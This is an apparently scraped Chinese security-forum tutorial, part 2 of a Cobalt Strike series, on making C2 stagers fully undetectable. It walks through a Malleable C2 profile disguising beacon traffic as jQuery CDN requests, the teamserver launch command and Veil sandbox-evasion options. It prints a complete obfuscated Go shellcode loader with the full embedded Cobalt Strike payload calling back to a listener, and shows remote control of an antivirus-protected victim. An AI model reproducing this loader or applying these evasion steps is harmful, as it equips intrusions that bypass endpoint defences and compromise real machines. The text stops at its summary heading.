> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/4191#toc-0)

### 简介

接上篇 [渗透利器 Cobalt Strike - 第 1 篇 功能及使用 - 先知社区](https://xz.aliyun.com/t/3975)

本文主要讲解，模拟 APT 手法对 Cobalt Strike 生成的程序进行全面免杀，实现了 完全不被检测 FUD(Fully undetectable)。

最终 stager 在以下方面实现了成功躲避：

*   文件查杀 (Signatured Static Scanning)
*   内存扫描 (Run-time Analysis)
*   流量分析 (NIPS/NIDS)
*   行为分析 (behavior Monitoring)

这是对 victim 进行稳定控制的基础。

### 免杀的多个维度

免杀就是逃避查杀的意思。通常需要多个维度进行免杀，概览免杀技术如下：

*   对抗 - 静态扫描
    *   1.shellcode 加密
        *   逃避原理: 避免被杀软直接获取到真正 shellcode(因为性能等原因 杀软不会暴力枚举以解密内容)
        *   局限: 使用了加解密函数 文件 size 可能会变大
    *   2. 文件不落地
        *   逃避原理: 文件不落地 难以被捕获样本
        *   局限: 不落地方案的任何操作都被提示。如 Powershell 的任何操作都会被杀软提示 “是否允许执行”。另外微软为 Powershell 等程序提供了扫描接口`Antimalware Scan Interface (AMSI)`以便对接受的数据进行扫描。
    *   3. 源码级修改
        *   逃避原理: 自主开发程序，源码级的修改较容易实现 "变种", 避免杀软报毒 (因为从未被捕获分析 应该不会被杀 所以建议一个样本仅对某一目标攻击)
        *   局限: 彻底改写源码难度大
    *   其他
*   对抗 - 内存扫描
    *   1.DLL 加载
        *   逃避原理: 杀软为了不影响系统性能，通常对 DLL 加载的审查宽松 (加载途径: 自己编程实现 dll 加载器 或 进行 "dll hijacking")
        *   局限: 文件落地
    *   2. 自定义加载器 (Customer Loader)
        *   逃避原理: 使用不同编程语言实现的 shellcode Loader，运行机制较不同，杀软可能没有足够精力跟进各种形式的加载器 (如 C# 使用虚拟机解释后运行 Golang 编译运行 等)
        *   局限: 文件落地
    *   其他
*   对抗 - 流量分析
    *   1. 白域名方法 - Domain Fronting
        *   逃避原理: 借用 CDN 实现 "隐藏"C2 服务器的真实 ip 避免溯源分析 C2 流量 -> CDN ip -> C2 Server ip
        *   局限: 使用 CDN，可能需要实名认证 (可考虑以其他身份注册)
    *   2. 白域名方法 - 借用知名网站
        *   逃避原理: 将 "命令数据" 加密处理发布在知名网站 即可实现被控端通过知名域名获取 C2 命令 避免流量特征告警 避免溯源分析
            *   国内 可被公开访问的页面 `weibo.com` `users.qzone.qq.com`
            *   国外 可被公开访问的页面 `google、twitter、pastbin、telegram ...`
        *   局限: 使用知名站点，可能需要实名认证 (可考虑以其他身份注册)
    *   3.DGA 域名 - DGA 域名生成算法
        *   逃避原理: 使用 dga 可以试图连接多个 C2 域名 从而避免 "单一 C2 域名 / ip 特征被当作 IoC 后引发报警" 这一报警机制 (黑名单) 大大增加了 C2 架构稳定性
        *   局限: dga 生成的域名可能被机器学习识别为恶意的. dga 需要注册不止一个域名. 可被持续追溯得到多个 C2 服务器 ip.
    *   其他
*   对抗 - 行为分析
    *   1. 指定特定的运行条件
        *   逃避原理: 即符合一定的条件才会进行 "恶意的" 操作行为。从而避免该程序在 VM、沙箱、逆向人员的眼皮底下进行恶意操作
        *   局限: 可能会限制运行环境，导致缩小可运行的目标范围 (如只能在某个指定域中计算机才能运行该程序)
    *   其他
*   对抗 - 逆向分析
    *   1. 加壳
        *   逃避原理: 通过加壳等方式延长被逆向分析人员彻底分析的时间
        *   局限: 没有绝对的反逆向保护，只能增加逆向分析难度
    *   其他
*   对抗 - 机器学习
    *   client ML - 杀软客户端内置的轻量级机器学习模型
    *   Cloud ML - 相关 ML 技术及训练数据不得而知

**注意: 逃避技术是和杀软技术的长期对抗。所有高超的逃避技巧都迟早被威胁检测技术发现。因为他们有尖端的技术和人才。**

### 对抗 - 流量分析

这里使用 Cobalt Strike 的 C2 配置文件，来将 C2 流量伪装成正常流量。以尽量避免被 NIDS 报警、SOC 系统安全运营人员等发现流量异常。

Cobalt Strike 的 C2 配置文件，定义了 victim 与 团队服务器 之间的 C2 通信流量的 “通信格式规范和方式”，通常安全人员就是从 C2 通信流量中寻找“流量特征” 的。

我这里考虑使用 jQuery 作为 C2 配置文件，也就是 victim 和团队服务器之间的 C2 流量是伪装成了 “某用户系统的浏览器与某 web 服务器之间正常交互的 WEB 流量”，具体就是，通常很常见的“从浏览器获取 jQuery 这一 JavaScript 文件” 有关的 web 流量。

为此，我写了个 C2 配置文件 [1135-CobaltStrike-ToolKit/malleable_C2_jQuery_c2.3.11_CN_cdn.bootcss.com.txt](https://github.com/1135/1135-CobaltStrike-ToolKit/blob/master/Malleable%20C2%20Files/malleable_C2_jQuery_c2.3.11_CN_cdn.bootcss.com.txt)

通过查看文件可以发现，我把伪装成某终端浏览器与国内这个 jQuery 的 CDN 站点`cdn.bootcss.com`的 web 流量（http 协议），更详细的见配置文件。

#### 团队服务器

本次测试中，团队服务器 ip 为 10.211.55.5  
在这里指定 定制的 C2 配置文件

启动团队服务器 命令如下：  
`sudo ./teamserver 10.211.55.5 U9assw0rd '/home/yourname/Desktop/malleable_C2_jQuery_c2.3.11_CN_cdn.bootcss.com.txt'`

#### 多种上线方式介绍

从团队服务器可以看到，本次测试使用了 ip 上线。

一些可选的其他上线方式，及其优劣 参考如下：

*   ip 上线
    *   缺点：如果被分析到 ip 地址，很容易提取到 IoC，从而被检测，C2 通信被阻断
*   域名上线（使用一个域名做 C2）
    *   优点：使用 C2 域名的 DNS A 记录，域名解析到自己的 C2 服务器的 ip，ip 可随时更改。
    *   缺点：如果被分析到域名，很容易提取到 IoC，从而被检测，C2 通信被阻断。
*   DGA 域名上线 （使用若干个域名 很大程度上保证 C2 通信）
    *   优点：如果能够自写远控 (这样的自定义程度最高)，使用 dga 上线，可以避免“C2 域名被拉黑” 导致的无法通信。
    *   缺点：DGA 域名也可能被机器学习模型检测到。

可以发现不同上线方式具有不同的 C2 通信的稳定性，本次只做演示，就使用最简单的 ip 上线方式。

### 生成 payload

打开 Cobalt Strike 客户端，进行常规操作：

*   创建一个 http 监听器
*   生成 payload

`Attacks -> Packages -> Payload Generator`  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20190222174456-8337e2f6-3686-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190222174456-8337e2f6-3686-1.png)

生成了一段 payload `\xfc\xe8\x89...`  
（如果在某个不安装杀软的系统中，只要有 stager 执行了本段 payload，则可实现对这个系统的控制。）

为了避免 stager 被企业的终端安全软件查杀，接下来，要对这段 payload 进行文件免杀。

### 对抗 - 终端安全

注意：关注文件免杀的原理、方法，而不是工具使用，工具只是辅助完成我们的免杀目的。  
本次具体使用 Veil 进行文件免杀。

#### Veil 搭建与概览

[Veil](https://www.veil-framework.com/) 在 Docker 使用即可：  
拉取镜像  
`docker pull mattiasohlsson/veil`  
启动容器  
`docker run -it -v /tmp/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil`  
其中 / tmp/veil-output 为我物理机 Mac 系统的路径，Docker 中的 Veil 将生成的 17yes.exe 等文件（见下文），存储在这个目录中。

Veil 自动启动，主要分为两个功能：

```
[*] Available Tools:
    1)  Evasion
    2)  Ordnance

#1 Evasion功能 用来做文件免杀（就选这个）

#2 Ordnance功能 用来快速生成MSF stager shellcode的工具(类似msfvenom)。
    可以生成6种payload：
    1)  bind_tcp          => Bind TCP Stager (Stage 1)
    2)  rev_http          => Reverse HTTP Stager (Stage 1)
    3)  rev_https         => Reverse HTTPS Stager (Stage 1)
    4)  rev_tcp           => Reverse TCP Stager (Stage 1)
    5)  rev_tcp_all_ports => Reverse TCP All Ports Stager (Stage 1)
    6)  rev_tcp_dns       => Reverse TCP DNS Stager (Stage 1)
```

我们现在需要文件免杀，所以选 1。  
`use 1`

在此暂停下，先介绍 “原理 - Veil 的文件免杀原理”，然后再看实操 “实操 - 文件免杀”。

### 原理 - Veil 的文件免杀原理

Veil 使用以下方法实现文件免杀：

*   将 payload 以加密形式保存
    *   aes
    *   des
    *   ...
*   判断运行环境是否是目标的运行环境（反沙箱 反虚拟机）
    *   进程数量
    *   cpu 核数
    *   当前计算机加入的域的名称
    *   当前计算机的计算机名
    *   当前系统的用户名
    *   当前 running 的进程数
    *   ...
*   混淆
    *   对源代码中的变量名进行混淆（见对 17yes.go 源代码的讲解部分）
*   内存申请方式
    *   stager 以 RW 权限申请内存 -> 将 shellcode 写入这部分内存 -> 将内存权限从 RW 更改为 RX -> 调用 CreateThread 和 WaitForSingleObject

#### 内存申请方式

传统内存申请方式：stager 程序使用 RWX（读，写和执行）权限申请内存，将 shellcode 写入这部分内存，创建一个线程来执行 shellcode，等待 shellcode 完成运行（即退出 Meterpreter 或 Beacon）即可退出 stager 程序。

“传统内存申请方式” 可能被反病毒引擎、沙箱引擎视为恶意的。

其实为了内存免杀效果，Veil 从 3.1 版本开始，`shellcode_inject`几乎不会使用 “传统内存申请方式” 申请内存空间。而是使用“渐进的内存申请方式”。

渐进的内存申请方式：stager 程序以 RW（读，写)权限申请内存内存，此时 stager 程序能够将 shellcode 写入这部分内存。stager 将调用 [VirtualProtect] 函数([https://docs.microsoft.com/zh-cn/windows/desktop/api/memoryapi/nf-memoryapi-virtualprotect) 将内存权限从 RW 更改为 RX（读，执行），然后 stager 将继续正常调用 CreateThread 和 WaitForSingleObject。](https://docs.microsoft.com/zh-cn/windows/desktop/api/memoryapi/nf-memoryapi-virtualprotect)%E5%B0%86%E5%86%85%E5%AD%98%E6%9D%83%E9%99%90%E4%BB%8ERW%E6%9B%B4%E6%94%B9%E4%B8%BARX%EF%BC%88%E8%AF%BB%EF%BC%8C%E6%89%A7%E8%A1%8C%EF%BC%89%EF%BC%8C%E7%84%B6%E5%90%8Estager%E5%B0%86%E7%BB%A7%E7%BB%AD%E6%AD%A3%E5%B8%B8%E8%B0%83%E7%94%A8CreateThread%E5%92%8CWaitForSingleObject%E3%80%82)

具体分析见下文，以本次生成的 17yes.go 为例讲解 “渐进的内存申请方式”。

### 实操 - 文件免杀

打开 Veil `use 1`之后，使用`list` 看到到 41 种 stager：

```
[*] Available Payloads:

    1)  autoit/shellcode_inject/flat.py

    2)  auxiliary/coldwar_wrapper.py
    3)  auxiliary/macro_converter.py
    4)  auxiliary/pyinstaller_wrapper.py

    5)  c/meterpreter/rev_http.py
    6)  c/meterpreter/rev_http_service.py
    7)  c/meterpreter/rev_tcp.py
    8)  c/meterpreter/rev_tcp_service.py

    9)  cs/meterpreter/rev_http.py
    10) cs/meterpreter/rev_https.py
    11) cs/meterpreter/rev_tcp.py
    12) cs/shellcode_inject/base64.py
    13) cs/shellcode_inject/virtual.py

    14) go/meterpreter/rev_http.py
    15) go/meterpreter/rev_https.py
    16) go/meterpreter/rev_tcp.py
    17) go/shellcode_inject/virtual.py

    18) lua/shellcode_inject/flat.py

    19) perl/shellcode_inject/flat.py

    20) powershell/meterpreter/rev_http.py
    21) powershell/meterpreter/rev_https.py
    22) powershell/meterpreter/rev_tcp.py
    23) powershell/shellcode_inject/psexec_virtual.py
    24) powershell/shellcode_inject/virtual.py

    25) python/meterpreter/bind_tcp.py
    26) python/meterpreter/rev_http.py
    27) python/meterpreter/rev_https.py
    28) python/meterpreter/rev_tcp.py
    29) python/shellcode_inject/aes_encrypt.py
    30) python/shellcode_inject/arc_encrypt.py
    31) python/shellcode_inject/base64_substitution.py
    32) python/shellcode_inject/des_encrypt.py
    33) python/shellcode_inject/flat.py
    34) python/shellcode_inject/letter_substitution.py
    35) python/shellcode_inject/pidinject.py
    36) python/shellcode_inject/stallion.py

    37) ruby/meterpreter/rev_http.py
    38) ruby/meterpreter/rev_https.py
    39) ruby/meterpreter/rev_tcp.py
    40) ruby/shellcode_inject/base64.py
    41) ruby/shellcode_inject/flat.py
```

对于 CS 生成的 payload (\x00...)，需使用`shellcode_inject`类型的 stager 进行免杀。

本次以第 17 个 stager `go/shellcode_inject/virtual.py` 为例，生成一个包含并执行 CSpayload 的 go 语言代码，和该代码编译成的可执行文件 17yes.exe(见下文):

`use 17`

接下来看到以下设置，意思是该 stager 执行时执行哪些检查与必要的配置（可以保证只有在满足指定条件时才会注入并执行嵌入的 shellcode 从而避免被沙箱等引擎行为分析）

```
Name                Value       Description
----                -----       -----------
BADMACS             FALSE       Check for VM based MAC addresses
CLICKTRACK          X           Require X number of clicks before execution
COMPILE_TO_EXE      Y           Compile to an executable
CURSORCHECK         FALSE       Check for mouse movements
DISKSIZE            X           Check for a minimum number of gigs for hard disk
HOSTNAME            X           Optional: Required system hostname
INJECT_METHOD       Virtual     Virtual or Heap
MINPROCS            X           Minimum number of running processes
PROCCHECK           FALSE       Check for active VM processes
PROCESSORS          X           Optional: Minimum number of processors
RAMCHECK            FALSE       Check for at least 3 gigs of RAM
SLEEP               X           Optional: Sleep "Y" seconds, check if accelerated
USERNAME            X           Optional: The required user account
USERPROMPT          FALSE       Prompt user prior to injection
UTCCHECK            FALSE       Check if system uses UTC time
```

具体解释下：

BADMACS 设置为 Y 表示 查看运行环境的 MAC 地址如果不是虚拟机才会执行 payload （反调试）  
CLICKTRACK 设置为 4 表示 表示需要 4 次点击才会执行  
CURSORCHECK 设置为 100 表示 运行环境的硬盘大小如果大于 100GB 才会执行 payload （反沙箱）  
COMPILE_TO_EXE 设置为 Y 表示 编译为 exe 文件  
HOSTNAME 设置为 Comp1 表示 只有在 Hostname 计算机名为 Comp1 时才会执行 payload（指定目标环境 反沙箱的方式）  
INJECT_METHOD 可设置为 Virtual 或 Heap  
MINPROCS 设置为 20 表示 只有运行环境的运行进程数大于 20 时才会执行 payload（指定目标环境 反沙箱的方式）  
PROCCHECK 设置为 Y 表示 只有运行环境的进程中没有虚拟机进程时才会执行 payload（指定目标环境 反沙箱的方式）  
PROCESSORS 设置为 2 表示 只在至少 2 核的机器中才会执行 payload（指定目标环境 反沙箱的方式）  
RAMCHECK 设置为 Y 表示 只在运行环境的内存为 3G 以上时才会执行 payload（指定目标环境 反沙箱的方式）  
SLEEP 设置为 10 表示 休眠 10 秒 以检测是否运行过程中被加速（反沙箱）  
USERNAME 设置为 Tom 表示 只有在当前用户名为 Tom 的机器中才执行 payload。  
USERPROMPT 设置为 Y 表示 在 injection 之前提醒用户（提示一个错误框，让用户误以为该程序执行错误才无法打开）  
DEBUGGER 设置为 Y 表示 当被调试器不被 attached 时才会执行 payload （反调试）  
DOMAIN 设置为 Comp 表示 受害者计算机只有加入 Comp 域中时，才会执行 payload（指定目标环境 反沙箱的方式）  
UTCCHECK 设置为 Y 表示 只在运行环境的系统使用 UTC 时间时，才会执行 payload

在这里我选择这样设置：  
[go/shellcode_inject/virtual>>]: set USERNAME lll  
[go/shellcode_inject/virtual>>]: set Sleep 10  
[go/shellcode_inject/virtual>>]: set HOSTNAME win7  
[go/shellcode_inject/virtual>>]: set UTCcheck TRUE

尝试生成：  
generate

在此选 3 并输入刚才生成的 CS 的 payload 字符串。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20190222174821-fd55a320-3686-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190222174821-fd55a320-3686-1.png)

然后 Veil 提示  
[>] Please enter the base name for output files (default is payload):  
请输入生成文件的名称，我输入了`17yes`

最后 生成了 2 个文件：

```
[*] Language: go
 [*] Payload Module: go/shellcode_inject/virtual
 [*] Executable written to: /var/lib/veil/output/compiled/17_yes.exe
 [*] Source code written to: /var/lib/veil/output/source/17_yes.go
```

其中 17yes.exe 就是进行文件免杀后生成的程序。

对 17yes.exe 进行文件扫描，查杀结果如下：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20190222175220-8c05df7c-3687-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190222175220-8c05df7c-3687-1.png)

文件免杀成功。

运行时是否会被查杀？还要看内存方面：

*   stager 的 “渐进的内存申请方式” 注入并执行 CS 的 shellcode
*   CS 的 shellcode 自身具有良好的内存免杀的能力

得益于以上两点，实测没有任何提示即可上线，功能一切正常。

#### 实测 远控功能

远程桌面：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20190222175420-d38f58c8-3687-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190222175420-d38f58c8-3687-1.png)

命令交互：  
可看到其中 ZhuDongFangYu.exe 和 HipsDaemon.exe 为杀软进程  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20190222175617-18df46f4-3688-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190222175617-18df46f4-3688-1.png)

远控功能正常，不受影响。

#### 原理 - Go 代码实例讲解 “渐进的内存申请方式”

参考文档：  
VirtualAlloc 函数详细解释 [VirtualAlloc function | Microsoft Docs](https://docs.microsoft.com/zh-cn/windows/desktop/api/memoryapi/nf-memoryapi-virtualalloc)  
内存保护的常量值及解释 [Memory Protection Constants - Windows applications | Microsoft Docs](https://docs.microsoft.com/zh-cn/windows/desktop/Memory/memory-protection-constants)

下面是 17yes.go 的讲解及其源代码。

**概览一下代码：**  
常量名、变量名都被混淆。  
第 31 行，可以明显看到 CS 完整的 payload `\xfc\xe8\x89...`。

**仔细看下代码：**

2-12 行，开头引入了必要的库文件。

13-16 行，定义了 3 个常量：（更具体的见 “VirtualAlloc 函数详细解释”）  
rANPMk = 0x1000 // MEM_COMMIT 为指定的保留内存分页（memory pages）分配内存空间 (根据内存的总体大小和磁盘上的分页文件)。  
sUZcPvprXOJt = 0x2000 //MEM_RESERVE 保留进程的一部分虚拟地址空间，而无需在内存或磁盘上的分页文件（paging file）中分配任何实际的物理存储。  
rFchBCmu = 0x04 // PAGE_READWRITE 对已提交的（committed）分页区域启用 Read-only 只读 或 RW 读写 访问权限。

24 行，定义了一个函数`laiTJbWfGgsLhF`（只是定义还未被调用），将以上 3 个常量值作为实参，传入`kernel32.dll`的`VirtualAlloc`函数中。以实现以 RW 权限申请内存。

33 行，通过`user.Current()`获取到当前用户，赋值给变量`dNnhwvvKJzppv`。

36 行，判断当前用户的名称是否是`lll`，如果是则继续执行，如果不是则退出程序。

40 行，判断当前的计算机名是否是`win7`，如果是则继续执行，如果不是则退出程序。

42-50 行，先向`us.pool.ntp.org:123`发送 UDP 请求获取当前时间，延时 10 秒后，再次发送 UDP 请求获取时间，如果两次时间小于 10 秒，则退出程序（程序可能在虚拟机中加速执行），否则继续执行。

52 行，调用`laiTJbWfGgsLhF`函数，以 RW 权限申请内存。

57-62 行，将 shellcode 写入这部分内存。

64 行，调用`VirtualProtect`函数，将这部分（RW 权限申请的）内存改为 RX 权限 `//0x20 PAGE_EXECUTE_READ`

68 行，调用分配的页面区域的基址（第 25 行中`VirtualProtect`函数的返回值，赋值给了变量`CtRsyrQfyp`），执行这段 shellcode。

结束。

17yes.go 中的代码如下：  
我用`//`写了相关注释

```
package main
import (
"syscall"
"unsafe"
"fmt"
"os"
"strings"
"os/user"
"net"
"time"
"encoding/binary"
)
const (
rANPMk  = 0x1000 // MEM_COMMIT
sUZcPvprXOJt = 0x2000 //MEM_RESERVE
rFchBCmu  = 0x04 // PAGE_READWRITE
)
var (
oSxMXhR = 0
osAvWlb = syscall.NewLazyDLL("kernel32.dll")
MXJoioL = osAvWlb.NewProc("VirtualAlloc")
eDMslOPiZZj = osAvWlb.NewProc("VirtualProtect")
)
func laiTJbWfGgsLhF(MYkcuzzzRXhOgZ uintptr) (uintptr, error) {
CtRsyrQfyp, _, ndNDpWTRkKOjw := MXJoioL.Call(0, MYkcuzzzRXhOgZ, sUZcPvprXOJt|rANPMk, rFchBCmu)
if CtRsyrQfyp == 0 {
return 0, ndNDpWTRkKOjw
}
return CtRsyrQfyp, nil
}
var KynNDPgjUmE string = "\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x0f\x27\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x60\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x6a\x71\x75\x65\x72\x79\x2d\x33\x2e\x33\x2e\x31\x2e\x73\x6c\x69\x6d\x2e\x6d\x69\x6e\x2e\x6a\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x41\x63\x63\x65\x70\x74\x3a\x20\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x2c\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x68\x74\x6d\x6c\x2b\x78\x6d\x6c\x2c\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x6d\x6c\x3b\x71\x3d\x30\x2e\x39\x2c\x2a\x2f\x2a\x3b\x71\x3d\x30\x2e\x38\x0d\x0a\x41\x63\x63\x65\x70\x74\x2d\x4c\x61\x6e\x67\x75\x61\x67\x65\x3a\x20\x65\x6e\x2d\x55\x53\x2c\x65\x6e\x3b\x71\x3d\x30\x2e\x35\x0d\x0a\x48\x6f\x73\x74\x3a\x20\x63\x64\x6e\x2e\x62\x6f\x6f\x74\x63\x73\x73\x2e\x63\x6f\x6d\x0d\x0a\x52\x65\x66\x65\x72\x65\x72\x3a\x20\x68\x74\x74\x70\x3a\x2f\x2f\x63\x64\x6e\x2e\x62\x6f\x6f\x74\x63\x73\x73\x2e\x63\x6f\x6d\x2f\x0d\x0a\x41\x63\x63\x65\x70\x74\x2d\x45\x6e\x63\x6f\x64\x69\x6e\x67\x3a\x20\x67\x7a\x69\x70\x2c\x20\x64\x65\x66\x6c\x61\x74\x65\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x33\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x37\x2e\x30\x3b\x20\x72\x76\x3a\x31\x31\x2e\x30\x29\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x0d\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\xaf\x0f\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x30\x2e\x32\x31\x31\x2e\x35\x35\x2e\x35\x00\x00\x00\x00\x00"
func main() {
dNnhwvvKJzppv, NIRbEkBGeBL := user.Current()
if NIRbEkBGeBL != nil {
os.Exit(1)}
if strings.Contains(strings.ToLower(dNnhwvvKJzppv.Username), strings.ToLower("lll")) {
jhYkqxWdxLYMRzS, tjbTZPVgxDczfz := os.Hostname()
if tjbTZPVgxDczfz != nil {
os.Exit(1)}
if strings.Contains(strings.ToLower(jhYkqxWdxLYMRzS), strings.ToLower("win7")) {
type ntp_struct struct {FirstByte,A,B,C uint8;D,E,F uint32;G,H uint64;ReceiveTime uint64;J uint64}
sock,_ := net.Dial("udp", "us.pool.ntp.org:123");sock.SetDeadline(time.Now().Add((6*time.Second)));defer sock.Close()
ntp_transmit := new(ntp_struct);ntp_transmit.FirstByte=0x1b
binary.Write(sock, binary.BigEndian, ntp_transmit);binary.Read(sock, binary.BigEndian, ntp_transmit)
val := time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((ntp_transmit.ReceiveTime >> 32)*1000000000)))
time.Sleep(time.Duration(10*1000) * time.Millisecond)
newsock,_ := net.Dial("udp", "us.pool.ntp.org:123");newsock.SetDeadline(time.Now().Add((6*time.Second)));defer newsock.Close()
second_transmit := new(ntp_struct);second_transmit.FirstByte=0x1b
binary.Write(newsock, binary.BigEndian, second_transmit);binary.Read(newsock, binary.BigEndian, second_transmit)
if int(time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((second_transmit.ReceiveTime >> 32)*1000000000))).Sub(val).Seconds()) >= 10 {_, vMrDrdraJQbRxiR := time.Now().Zone()
if vMrDrdraJQbRxiR != 0 {
CtRsyrQfyp, ndNDpWTRkKOjw := laiTJbWfGgsLhF(uintptr(len(KynNDPgjUmE)))
if ndNDpWTRkKOjw != nil {
fmt.Println(ndNDpWTRkKOjw)
os.Exit(1)
}
kRNlwGx := (*[890000]byte)(unsafe.Pointer(CtRsyrQfyp))
var oSxMXhR uintptr
var qKMrlhYe uintptr
for dpKAFprpzXfHZ, nSaJOFBoKFYcvC := range []byte(KynNDPgjUmE) {
kRNlwGx[dpKAFprpzXfHZ] = nSaJOFBoKFYcvC
}
//0x20 PAGE_EXECUTE_READ
oSxMXhR, _, ndNDpWTRkKOjw = eDMslOPiZZj.Call(CtRsyrQfyp, uintptr(len(KynNDPgjUmE)), 0x20, uintptr(unsafe.Pointer(&qKMrlhYe)))
if oSxMXhR == 0 {
os.Exit(1)
}
syscall.Syscall(CtRsyrQfyp, 0, 0, 0, 0)
}
}}}}
```

至此，已经清楚本 stager 程序的逻辑，如果读者有 go 语言开发能力，可继续新增、改写相关逻辑，实现功能的高度的自定义，达到 “源码级” 免杀能力。

改完之后可将自己改写的 Golang 代码的编译为二进制文件，得益于 Golang 的交叉编译特性，可以直接在 Mac 系统下编译 Windows 的可执行文件 (.exe)，命令为`CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build main.go`，直接在 Windows 系统下编译生成当然也可以，不再赘述。

### 对抗 - 行为分析

在进行文件免杀处理的时候，其实已经指定了目标机的环境（用户名为`lll`，计算机名为 `win7`，等运行条件），如果不符合这些条件，stager 将不会执行任何恶意行为，而是直接退出。

对抗效果很好，参考以下两个云沙箱的检测结果。

#### app.any.run 云沙箱

[https://app.any.run/tasks/85309f79-0054-4ab9-9ff3-7f9acb1eea18](https://app.any.run/tasks/85309f79-0054-4ab9-9ff3-7f9acb1eea18)

可以看到在云沙箱中，stager 程序没有进行任何恶意行为，并得到了 “无恶意” 的判断。  
NO SUSPICIOUS EVENTS：没有任何可疑事件。  
底下可以看到，也没有任何 http、dns 等网络流量。  
也没有被关联到任何威胁。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20190223190540-f490d78a-375a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190223190540-f490d78a-375a-1.png)

#### ti 云沙箱

[https://sandbox.ti.360.net/sandbox/page/detail?type=file&sha1=a3bedcf16cd9350b043b4cab755ad28492f7a4f8&id=AWkaDMWZxOygT_R0bYVa&env=&time=](https://sandbox.ti.360.net/sandbox/page/detail?type=file&sha1=a3bedcf16cd9350b043b4cab755ad28492f7a4f8&id=AWkaDMWZxOygT_R0bYVa&env=&time=)

可以看到在云沙箱中，stager 程序没有进行任何恶意行为。恶意评分仅为 9。  
（标签处说明是 “加壳程序” 其实是误判，PEID 也会看到加壳，都是对 Golang 编译的程序的识别不够导致的误判）

威胁判定：未发现恶意行为。  
动态检测：未发现恶意行为。  
静态检测：未发现恶意行为。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20190223192049-1262cdca-375d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20190223192049-1262cdca-375d-1.png)

### 对抗 - 逆向分析

本次测试免杀效果已经足够，所以未做加壳等处理。  
另外，加强壳也可能被认为比较可疑的，有的杀软发现强壳就报毒。

### 免杀总结

